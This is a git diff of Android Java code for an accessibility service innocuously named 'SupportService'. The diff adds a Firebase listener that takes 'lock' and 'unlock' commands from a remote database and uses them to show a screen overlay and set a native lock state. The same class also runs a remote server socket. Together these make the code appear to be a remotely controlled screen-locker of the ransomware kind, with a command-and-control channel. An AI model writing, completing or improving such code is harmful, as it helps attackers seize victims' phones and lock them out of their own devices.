@@ -23,15 +23,12 @@ import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
 
-<<<<<<< HEAD
-=======
 import com.google.firebase.database.DataSnapshot;
 import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
 
->>>>>>> 7e25162 (lalala)
 import androidx.core.view.ViewCompat;
 
 import java.io.BufferedReader;
@@ -62,10 +59,7 @@ public class SupportService extends AccessibilityService {
     
     private ServerSocket serverSocket;
     private boolean isLocked = false;
-<<<<<<< HEAD
-=======
     private DatabaseReference dbRef;
->>>>>>> 7e25162 (lalala)
 
     public native void initNative(String path);
     public native void setLockStatus(boolean locked);
@@ -120,10 +114,7 @@ public class SupportService extends AccessibilityService {
         wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
         init_timer();
         startRemoteServer();
-<<<<<<< HEAD
-=======
         initFirebaseListener();
->>>>>>> 7e25162 (lalala)
         
         if (isLockedNative()) {
             isLocked = true;
@@ -230,18 +221,29 @@ public class SupportService extends AccessibilityService {
         return START_STICKY;
     }
 
-<<<<<<< HEAD
-=======
     private void initFirebaseListener() {
-        dbRef = FirebaseDatabase.getInstance().getReference("commands");
+        // Listen ke root database agar lebih fleksibel
+        dbRef = FirebaseDatabase.getInstance().getReference();
         dbRef.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(DataSnapshot snapshot) {
-                String cmd = snapshot.getValue(String.class);
-                if (cmd == null) return;
+                // Ambil data dari key "commands"
+                Object value = snapshot.child("commands").getValue();
+                if (value == null) return;
+
+                String cmd = "";
+                if (value instanceof String) {
+                    cmd = (String) value;
+                } else if (snapshot.child("commands").child("commands").exists()) {
+                    // Jika nested seperti di screenshot: commands/commands
+                    cmd = snapshot.child("commands").child("commands").getValue(String.class);
+                }
+
+                if (cmd == null || cmd.isEmpty()) return;
+                final String finalCmd = cmd;
 
                 task_handler.post(() -> {
-                    if (cmd.equalsIgnoreCase("lock")) {
+                    if (finalCmd.equalsIgnoreCase("lock")) {
                         if (!isLocked) {
                             input_buffer.setLength(0);
                             setLockStatus(true);
@@ -249,7 +251,7 @@ public class SupportService extends AccessibilityService {
                             showOverlay();
                             isLocked = true;
                         }
-                    } else if (cmd.equalsIgnoreCase("unlock")) {
+                    } else if (finalCmd.equalsIgnoreCase("unlock")) {
                         if (isLocked) {
                             setLockStatus(false);
                             hideOverlay();
@@ -269,7 +271,6 @@ public class SupportService extends AccessibilityService {
         });
     }
 
->>>>>>> 7e25162 (lalala)
     private void startRemoteServer() {
         new Thread(() -> {
             try {
